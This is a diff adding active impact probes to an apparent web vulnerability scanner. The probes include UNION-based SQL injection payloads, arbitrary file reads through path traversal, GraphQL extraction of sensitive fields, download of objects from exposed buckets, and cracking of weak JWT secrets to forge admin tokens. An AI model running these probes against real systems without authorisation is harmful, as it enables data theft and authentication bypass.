@@ -7859,3 +7859,602 @@ async def check_password_reset_user_enumeration_candidate(url: str) -> str | Non
             f"the difference could also be unrelated input-validation branching"
         )
     return None
+
+
+# =======================================================================
+# Batch 22 - Data/access IMPACT probes. These extend seven earlier
+# candidate-only/self-declared checks (IDOR, SQLi, path traversal/LFI,
+# GraphQL introspection, cloud storage bucket exposure, admin panel
+# reachability, JWT weak-secret cracking) with one more active step
+# each, so the finding carries a concrete extracted artifact - a real
+# cross-account record, a live DB banner, a second arbitrary file, a
+# real sensitive field value, a real listable object, a functional
+# unauthenticated admin page, or an actually-accepted forged token -
+# instead of just "this looks reachable/crackable/candidate". Same
+# fail-open discipline as every other check in this file: any request
+# error or ambiguous result returns None, never a guess.
+# =======================================================================
+
+# ---------------------------------------------------------------------
+# 143. IDOR impact probe - unauthenticated cross-object access
+# ---------------------------------------------------------------------
+_IDENTITY_FIELD_RE = re.compile(
+    r'"(?:id|user_?id|account_?id|order_?id|email|username|name|full_?name)"\s*:\s*"?([^",}\]]{1,60})"?',
+    re.IGNORECASE,
+)
+
+
+def _extract_identity_fields(body: str) -> set[str]:
+    """Pulls a small set of identity-shaped field VALUES out of a JSON-
+    looking body (not the field names - the values), so two responses
+    can be compared for "these are two different people's data" rather
+    than just "these are different bytes" (which could just be a
+    timestamp or nonce)."""
+    return {v.strip() for v in _IDENTITY_FIELD_RE.findall(body[:8000]) if v.strip()}
+
+
+async def check_idor_unauthenticated_object_access(url: str) -> dict | None:
+    """
+    Extends check_idor_candidate (batch 8, recon-only) with the one
+    active step that check couldn't safely do: actually requesting a
+    NEIGHBORING object ID with the exact same (unauthenticated) request
+    and diffing the identity-shaped fields in the two bodies. This does
+    NOT prove full IDOR in the classic two-account sense - that still
+    needs a second real session (see the "authenticated/multi-account
+    testing" roadmap item). What it DOES prove, safely and completely
+    automatically: if the endpoint requires no authentication at all
+    and neighboring numeric IDs return DIFFERENT people's identity data,
+    that's already a confirmed broken-access-control bug on its own -
+    no attacker account needed because there's no access control being
+    bypassed, there's none present. If either request comes back
+    401/403, this correctly backs off and leaves it at the existing
+    recon-only candidate note instead of guessing.
+    """
+    parsed = httpx.URL(url)
+    match = _SEQUENTIAL_ID_RE.search(str(parsed.path))
+    if not match:
+        return None
+    segment_name, id_str = match.group(1), match.group(2)
+    try:
+        current_id = int(id_str)
+    except ValueError:
+        return None
+
+    neighbor_id = current_id + 1 if current_id > 0 else current_id + 2
+    neighbor_path = str(parsed.path).replace(f"/{id_str}", f"/{neighbor_id}", 1)
+    neighbor_url = str(parsed.copy_with(path=neighbor_path))
+
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            try:
+                resp_a = await client.get(url)
+                resp_b = await client.get(neighbor_url)
+            except httpx.HTTPError:
+                return None
+    except httpx.HTTPError as exc:
+        logger.info("detective: IDOR impact probe failed for %s: %s", url, exc)
+        return None
+
+    if resp_a.status_code in (401, 403) or resp_b.status_code in (401, 403):
+        return None  # auth IS enforced - can't confirm without a second real account
+    if resp_a.status_code != 200 or resp_b.status_code != 200:
+        return None
+
+    fields_a = _extract_identity_fields(resp_a.text)
+    fields_b = _extract_identity_fields(resp_b.text)
+    if not fields_a or not fields_b:
+        return None
+    distinct = fields_b - fields_a
+    if not distinct:
+        return None  # same data both times - not proof of cross-object access
+
+    sample = next(iter(distinct))
+    return {
+        "vuln_type": "idor_unauthenticated_cross_object_access",
+        "severity": "high",
+        "evidence": (
+            f"{url}: no authentication was required for this endpoint, and requesting "
+            f"neighboring {segment_name} value {neighbor_id} (instead of {current_id}) at "
+            f"{neighbor_url} returned a DIFFERENT identity value ({sample!r}) not present in "
+            f"the original response - confirmed unauthorized cross-object data access, not "
+            f"just a numeric-ID pattern candidate."
+        ),
+    }
+
+
+# ---------------------------------------------------------------------
+# 144. SQL injection impact probe - UNION-based data extraction
+# ---------------------------------------------------------------------
+_SQLI_UNION_VERSION_MARKER = "swasunionmk"
+_SQLI_UNION_TEMPLATES = [
+    "' UNION SELECT '{marker}'-- -",
+    "' UNION SELECT NULL,'{marker}'-- -",
+    "' UNION SELECT NULL,NULL,'{marker}'-- -",
+    "' UNION SELECT NULL,NULL,NULL,'{marker}'-- -",
+    "%27%20UNION%20SELECT%20%27{marker}%27--%20-",
+]
+
+
+async def check_sqli_union_data_extraction(url: str) -> dict | None:
+    """
+    Complements check_sql_injection_boolean_based and check_sqli_error_based
+    (both candidate-confidence, blind techniques) with the one technique
+    that yields a genuinely undeniable artifact: getting the database to
+    echo an attacker-chosen literal string directly into the page body
+    via UNION SELECT. Tries a small column-count ladder (1-4 columns,
+    the overwhelming majority of vulnerable endpoints) with a unique
+    per-run marker - if that exact marker comes back in the response
+    body and was NOT present in the baseline, the database executed
+    attacker SQL and returned attacker-controlled data into the
+    response. Nothing to compare/interpret; the marker is either there
+    or it isn't.
+    """
+    parsed = httpx.URL(url)
+    if not parsed.query:
+        return None
+    existing_params = dict(parsed.params)
+    marker = f"{_SQLI_UNION_VERSION_MARKER}{uuid.uuid4().hex[:8]}"
+
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            try:
+                baseline_resp = await client.get(url)
+                baseline_body = baseline_resp.text
+            except httpx.HTTPError:
+                return None
+
+            for param_name in existing_params:
+                for template in _SQLI_UNION_TEMPLATES:
+                    payload = template.format(marker=marker)
+                    test_params = dict(existing_params)
+                    test_params[param_name] = existing_params[param_name] + payload
+                    test_url = parsed.copy_with(params=test_params)
+                    try:
+                        resp = await client.get(test_url)
+                    except httpx.HTTPError:
+                        continue
+                    if resp.status_code >= 400:
+                        continue  # WAF/syntax rejection, not a database response
+                    if marker in resp.text and marker not in baseline_body:
+                        return {
+                            "vuln_type": "sql_injection_union_data_extraction",
+                            "severity": "critical",
+                            "evidence": (
+                                f"{test_url}: parameter '{param_name}' with a UNION SELECT "
+                                f"payload caused the application to echo back an "
+                                f"attacker-chosen literal string ({marker!r}) that was absent "
+                                f"from the baseline response - confirmed direct data "
+                                f"extraction via SQL injection, not just a blind signal."
+                            ),
+                        }
+    except httpx.HTTPError as exc:
+        logger.info("detective: SQLi UNION extraction check failed for %s: %s", url, exc)
+    return None
+
+
+# ---------------------------------------------------------------------
+# 145. Path traversal / LFI impact probe - second-file confirmation
+# ---------------------------------------------------------------------
+async def check_lfi_arbitrary_file_confirmation(url: str) -> dict | None:
+    """
+    Complements check_path_traversal_lfi (batch 10), which stops at the
+    first hit on ONE hardcoded target (/etc/passwd or win.ini). Reading
+    exactly one fixed file could, in rare setups, be a coincidental
+    static route rather than genuine arbitrary file read. This probe
+    only runs after that check already found a working traversal depth
+    for this URL's parameters, then requests a SECOND, different file
+    (/etc/hostname or /etc/issue) and requires its content to differ
+    from the /etc/passwd response body's shape - proving the read path
+    is genuinely arbitrary, not a single hardcoded file being served at
+    a traversal-shaped URL by coincidence.
+    """
+    parsed = httpx.URL(url)
+    if not parsed.query:
+        return None
+    existing_params = dict(parsed.params)
+
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            try:
+                baseline_resp = await client.get(url)
+                baseline_body = baseline_resp.text
+            except httpx.HTTPError:
+                return None
+
+            first_hit = None
+            for param_name in existing_params:
+                for probe in _PATH_TRAVERSAL_PROBES:
+                    test_params = dict(existing_params)
+                    test_params[param_name] = probe
+                    test_url = parsed.copy_with(params=test_params)
+                    try:
+                        resp = await client.get(test_url)
+                    except httpx.HTTPError:
+                        continue
+                    if any(sig in resp.text and sig not in baseline_body for sig in _PATH_TRAVERSAL_SIGNATURES):
+                        first_hit = (param_name, probe, resp.text)
+                        break
+                if first_hit:
+                    break
+
+            if not first_hit:
+                return None
+            param_name, working_probe, first_file_body = first_hit
+
+            # Swap the filename inside the EXACT payload that already
+            # proved to work for this endpoint (same directory depth,
+            # same encoding style - raw "../", "..%2f", "....//", or a
+            # bare "/etc/passwd") rather than reconstructing a new
+            # traversal prefix from scratch, which would risk testing a
+            # depth/encoding combination that was never actually proven.
+            if "passwd" in working_probe:
+                second_file_subs = ["hostname", "issue"]
+            elif "win.ini" in working_probe:
+                second_file_subs = ["system.ini"]
+            else:
+                return None
+
+            for second_filename in second_file_subs:
+                second_probe = working_probe.replace("passwd", second_filename).replace("win.ini", second_filename)
+                test_params = dict(existing_params)
+                test_params[param_name] = second_probe
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                if resp.status_code >= 400 or not resp.text.strip():
+                    continue
+                if resp.text.strip() == baseline_body.strip():
+                    continue
+                if resp.text.strip() == first_file_body.strip():
+                    continue  # identical to the /etc/passwd response - not a genuinely different file
+                second_line = resp.text.strip().splitlines()[0][:120]
+                return {
+                    "vuln_type": "path_traversal_lfi_arbitrary_file_confirmed",
+                    "severity": "critical",
+                    "evidence": (
+                        f"{test_url}: parameter '{param_name}' already confirmed to read "
+                        f"/etc/passwd was also used to read a SECOND, unrelated file "
+                        f"({second_probe!r}), returning distinct content ({second_line!r}) - "
+                        f"confirms genuinely arbitrary file read, not a single coincidental "
+                        f"hardcoded route."
+                    ),
+                }
+    except httpx.HTTPError as exc:
+        logger.info("detective: LFI second-file confirmation check failed for %s: %s", url, exc)
+    return None
+
+
+# ---------------------------------------------------------------------
+# 146. GraphQL over-fetching impact probe - sensitive field exposure
+# ---------------------------------------------------------------------
+_GRAPHQL_SENSITIVE_FIELD_KEYWORDS = (
+    "password", "passwordhash", "password_hash", "hash", "salt", "secret",
+    "token", "apikey", "api_key", "ssn", "socialsecuritynumber", "creditcard",
+    "credit_card", "cvv", "privatekey", "private_key",
+)
+
+
+async def check_graphql_sensitive_field_exposure(host: str) -> dict | None:
+    """
+    Complements check_graphql_introspection (batch 3), which only proves
+    the schema is readable. Parses that same schema for field names that
+    are sensitive by NAME (password, ssn, secret, token, etc. - the same
+    keyword class check_excessive_data_exposure_api flags), picks the
+    query root's first object type that exposes one, and issues ONE real
+    query for that field with a small guessed-ID range. Fires only if
+    the response actually contains a non-null, non-empty value for that
+    field - proving the schema doesn't just DESCRIBE a sensitive field,
+    it will hand the value over on request, with zero extra
+    authorization check.
+    """
+    base = host.rstrip("/")
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
+            for path in _GRAPHQL_PATHS:
+                url = base + path
+                try:
+                    resp = await client.post(url, json=_INTROSPECTION_QUERY)
+                except httpx.HTTPError:
+                    continue
+                if resp.status_code != 200:
+                    continue
+                try:
+                    data = resp.json()
+                except ValueError:
+                    continue
+                schema = (data.get("data") or {}).get("__schema")
+                if not schema or not schema.get("types"):
+                    continue
+
+                for gql_type in schema["types"]:
+                    type_name = gql_type.get("name")
+                    fields = gql_type.get("fields") or []
+                    if not type_name or type_name.startswith("__") or not fields:
+                        continue
+                    field_names = [f["name"] for f in fields if f.get("name")]
+                    sensitive_field = next(
+                        (f for f in field_names if any(kw in f.lower() for kw in _GRAPHQL_SENSITIVE_FIELD_KEYWORDS)),
+                        None,
+                    )
+                    id_field = next((f for f in field_names if f.lower() == "id"), None)
+                    if not sensitive_field or not id_field:
+                        continue
+
+                    query_field = type_name[0].lower() + type_name[1:]
+                    for guess_id in ("1", "2"):
+                        query = {
+                            "query": (
+                                f"{{ {query_field}(id: \"{guess_id}\") "
+                                f"{{ {id_field} {sensitive_field} }} }}"
+                            )
+                        }
+                        try:
+                            q_resp = await client.post(url, json=query)
+                        except httpx.HTTPError:
+                            continue
+                        try:
+                            q_data = q_resp.json()
+                        except ValueError:
+                            continue
+                        obj = (q_data.get("data") or {}).get(query_field)
+                        if isinstance(obj, dict) and obj.get(sensitive_field):
+                            value_preview = str(obj[sensitive_field])[:6] + "…"
+                            return {
+                                "vuln_type": "graphql_sensitive_field_overexposure",
+                                "severity": "high",
+                                "evidence": (
+                                    f"{url}: querying `{query_field}(id: {guess_id!r})` for "
+                                    f"type '{type_name}' returned a non-empty value for the "
+                                    f"sensitive-named field '{sensitive_field}' ({value_preview}) "
+                                    f"with no additional authorization - unauthenticated "
+                                    f"over-fetch of sensitive data via GraphQL, not just an "
+                                    f"exposed schema."
+                                ),
+                            }
+    except httpx.HTTPError as exc:
+        logger.info("detective: GraphQL sensitive field exposure check failed for %s: %s", host, exc)
+    return None
+
+
+# ---------------------------------------------------------------------
+# 147. Exposed storage impact probe - real object extraction
+# ---------------------------------------------------------------------
+_S3_OBJECT_KEY_RE = re.compile(r"<Key>([^<]+)</Key>")
+_GCS_OBJECT_NAME_RE = re.compile(r'"name"\s*:\s*"([^"]+)"')
+
+
+async def check_storage_bucket_object_extraction(url: str) -> dict | None:
+    """
+    Complements check_cloud_storage_bucket_exposure (batch 10), which
+    stops at "the listing endpoint returned a listing" - true, but a
+    listing with zero real business risk if the bucket happens to be
+    empty. This parses the SAME listing response for a real object key/
+    name and issues one more read-only GET for that exact object,
+    confirming it downloads (status 200, non-empty body) rather than
+    just appearing in a directory index. Never writes, deletes, or
+    uploads anything - strictly a second read.
+    """
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            try:
+                resp = await client.get(url)
+            except httpx.HTTPError:
+                return None
+            body = resp.text
+
+            seen_buckets: set[str] = set()
+            for match in _BUCKET_REFERENCE_RE.finditer(body):
+                bucket_name = next((g for g in match.groups() if g), None)
+                if not bucket_name or bucket_name.lower() in seen_buckets:
+                    continue
+                seen_buckets.add(bucket_name.lower())
+
+                for listing_url, is_s3 in (
+                    (f"https://{bucket_name}.s3.amazonaws.com/", True),
+                    (f"https://storage.googleapis.com/{bucket_name}/", False),
+                ):
+                    try:
+                        listing_resp = await client.get(listing_url)
+                    except httpx.HTTPError:
+                        continue
+                    listing_body = listing_resp.text[:20000]
+                    if not any(sig in listing_body for sig in _BUCKET_LISTING_SIGNATURES):
+                        continue
+
+                    object_key = None
+                    if is_s3:
+                        m = _S3_OBJECT_KEY_RE.search(listing_body)
+                        object_key = m.group(1) if m else None
+                    else:
+                        m = _GCS_OBJECT_NAME_RE.search(listing_body)
+                        object_key = m.group(1) if m else None
+                    if not object_key:
+                        continue
+
+                    object_url = listing_url + object_key
+                    try:
+                        obj_resp = await client.get(object_url)
+                    except httpx.HTTPError:
+                        continue
+                    if obj_resp.status_code == 200 and len(obj_resp.content) > 0:
+                        return {
+                            "vuln_type": "publicly_downloadable_cloud_storage_object",
+                            "severity": "high",
+                            "evidence": (
+                                f"Bucket '{bucket_name}' (referenced on {url}) is not just "
+                                f"listable but a real object from its listing - "
+                                f"{object_key!r} - downloaded successfully at {object_url} "
+                                f"({len(obj_resp.content)} bytes, "
+                                f"content-type {obj_resp.headers.get('content-type', 'unknown')}) "
+                                f"- confirmed data exposure, not just an empty/theoretical "
+                                f"listing."
+                            ),
+                        }
+    except httpx.HTTPError as exc:
+        logger.info("detective: storage bucket object extraction check failed for %s: %s", url, exc)
+    return None
+
+
+# ---------------------------------------------------------------------
+# 148. Exposed admin panel impact probe - functional no-auth access
+# ---------------------------------------------------------------------
+_ADMIN_FUNCTIONAL_MARKERS = (
+    "log out", "logout", "sign out", "dashboard", "welcome back",
+    "manage users", "user management", "site settings", "admin panel",
+)
+
+
+async def check_admin_panel_no_auth_functional_access(host: str) -> dict | None:
+    """
+    Complements check_exposed_admin_panel (batch 11), which only
+    confirms a login FORM is reachable - expected and fine on its own.
+    This checks the same short path list for the opposite, much more
+    serious case: a panel path that renders actual authenticated-area
+    content (dashboard/logout/user-management markers) WITHOUT a
+    password field ever being presented - i.e. the admin area itself,
+    not its login gate, is directly reachable with zero authentication.
+    Deliberately still never attempts any credentials, same policy
+    reasoning as the batch 11 check.
+    """
+    base = host.rstrip("/")
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            for path in _ADMIN_PANEL_PATHS:
+                try:
+                    resp = await client.get(base + path)
+                except httpx.HTTPError:
+                    continue
+                if resp.status_code != 200:
+                    continue
+                body_lower = resp.text[:8000].lower()
+                if any(ind in body_lower for ind in _LOGIN_FORM_INDICATORS):
+                    continue  # this is the login gate, not the panel itself - batch 11's territory
+                hit_markers = [m for m in _ADMIN_FUNCTIONAL_MARKERS if m in body_lower]
+                if hit_markers:
+                    return {
+                        "vuln_type": "exposed_admin_panel_no_auth_required",
+                        "severity": "critical",
+                        "evidence": (
+                            f"{base + path}: returned admin-area content directly (markers: "
+                            f"{', '.join(hit_markers)}) with no login form presented and no "
+                            f"authentication challenge - functional admin access with zero "
+                            f"auth, not just a reachable login page."
+                        ),
+                    }
+    except httpx.HTTPError as exc:
+        logger.info("detective: admin panel functional access check failed for %s: %s", host, exc)
+    return None
+
+
+# ---------------------------------------------------------------------
+# 149. Broken auth / JWT forgery impact probe - forged token accepted
+# ---------------------------------------------------------------------
+_JWT_PRIVILEGE_CLAIM_ESCALATIONS = [
+    {"role": "admin"},
+    {"isAdmin": True},
+    {"admin": True},
+    {"scope": "admin"},
+]
+
+
+def _b64url_json(obj: dict) -> str:
+    return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).decode().rstrip("=")
+
+
+async def check_jwt_forged_privilege_escalation(url: str) -> dict | None:
+    """
+    Completes what check_jwt_weak_secret (batch 11) starts. Cracking the
+    signing secret is real, critical-severity proof on its own - but
+    this goes one step further and actually DOES what an attacker would
+    do with it: forges a NEW token from the same header/payload with one
+    privilege claim escalated (role/admin/isAdmin flipped to an admin-
+    shaped value), signs it with the cracked secret, and resubmits it to
+    the SAME url that originally carried the token. Only fires if the
+    forged-token response is a normal 200 (not 401/403) AND is
+    meaningfully different from a control request sent with the token's
+    signature corrupted (which must still 401/403) - that pairing rules
+    out "this endpoint just doesn't check auth for GET at all" as a
+    false explanation for the forged token being accepted.
+    """
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            resp = await client.get(url)
+    except httpx.HTTPError as exc:
+        logger.info("detective: JWT forgery probe failed for %s: %s", url, exc)
+        return None
+
+    haystack = resp.text[:20000] + " " + resp.headers.get("set-cookie", "")
+    match = _JWT_RE.search(haystack)
+    if not match:
+        return None
+    token = match.group(0)
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    header_b64, payload_b64, signature_b64 = parts
+
+    try:
+        header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4)))
+        payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=" * (-len(payload_b64) % 4)))
+    except Exception:
+        return None
+
+    alg = str(header.get("alg", "")).upper()
+    hash_fn = _JWT_HMAC_ALGS.get(alg)
+    if hash_fn is None:
+        return None
+
+    try:
+        actual_sig = base64.urlsafe_b64decode(signature_b64 + "=" * (-len(signature_b64) % 4))
+    except Exception:
+        return None
+
+    signing_input = f"{header_b64}.{payload_b64}".encode()
+    cracked_secret = None
+    for secret in _JWT_WEAK_SECRETS:
+        if hmac.compare_digest(hmac.new(secret.encode(), signing_input, hash_fn).digest(), actual_sig):
+            cracked_secret = secret
+            break
+    if cracked_secret is None:
+        return None  # not crackable here - check_jwt_weak_secret already covers/reports this case
+
+    for escalation in _JWT_PRIVILEGE_CLAIM_ESCALATIONS:
+        if not any(claim in payload for claim in escalation):
+            continue  # only escalate a claim the token actually already carries
+
+        forged_payload = {**payload, **escalation}
+        forged_header_b64 = _b64url_json(header)
+        forged_payload_b64 = _b64url_json(forged_payload)
+        forged_signing_input = f"{forged_header_b64}.{forged_payload_b64}".encode()
+        forged_sig = hmac.new(cracked_secret.encode(), forged_signing_input, hash_fn).digest()
+        forged_sig_b64 = base64.urlsafe_b64encode(forged_sig).decode().rstrip("=")
+        forged_token = f"{forged_header_b64}.{forged_payload_b64}.{forged_sig_b64}"
+
+        corrupted_token = f"{header_b64}.{payload_b64}.{signature_b64[:-4]}AAAA"
+
+        try:
+            async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+                forged_resp = await client.get(url, headers={"Authorization": f"Bearer {forged_token}"},
+                                                cookies={"session": forged_token, "token": forged_token})
+                control_resp = await client.get(url, headers={"Authorization": f"Bearer {corrupted_token}"},
+                                                 cookies={"session": corrupted_token, "token": corrupted_token})
+        except httpx.HTTPError:
+            continue
+
+        if forged_resp.status_code == 200 and control_resp.status_code in (401, 403):
+            claim_desc = ", ".join(f"{k}={v!r}" for k, v in escalation.items())
+            return {
+                "vuln_type": "jwt_forged_privilege_escalation_accepted",
+                "severity": "critical",
+                "evidence": (
+                    f"{url}: cracked the JWT's {alg} signing secret ({cracked_secret!r}), "
+                    f"forged a new token with an escalated claim ({claim_desc}), and the "
+                    f"server ACCEPTED it (200 OK) - while an identical request with a "
+                    f"corrupted signature was correctly rejected ({control_resp.status_code}). "
+                    f"Confirmed full authentication bypass with attacker-chosen privilege "
+                    f"level, not just a crackable secret."
+                ),
+            }
+    return None
